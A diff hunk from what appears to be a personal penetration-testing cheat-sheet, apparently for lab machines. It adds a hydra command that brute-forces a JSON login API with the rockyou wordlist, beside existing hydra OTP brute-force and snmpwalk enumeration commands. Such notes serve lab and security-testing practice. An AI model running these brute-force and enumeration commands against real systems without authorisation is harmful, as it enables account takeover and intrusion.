@@ -368,6 +368,7 @@ tmux -S .details attach
 
 [hydra: json]
 hydra -l admin@e-shopping-cart.com -P wordlistts.txt 192.95.148.3 http-post-form '/validate-otp:{\"email\"\:\"^USER^\",\"password\"\:\"pass\",\"otp\"\:\"^PASS^\"}:Error' -s 8080 -V
+hydra -l admin -P /opt/rockyou.txt management.escobar.hmv http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
 
 [snmp enumeration]
 snmpwalk -v1 -c public 192.168.68.108
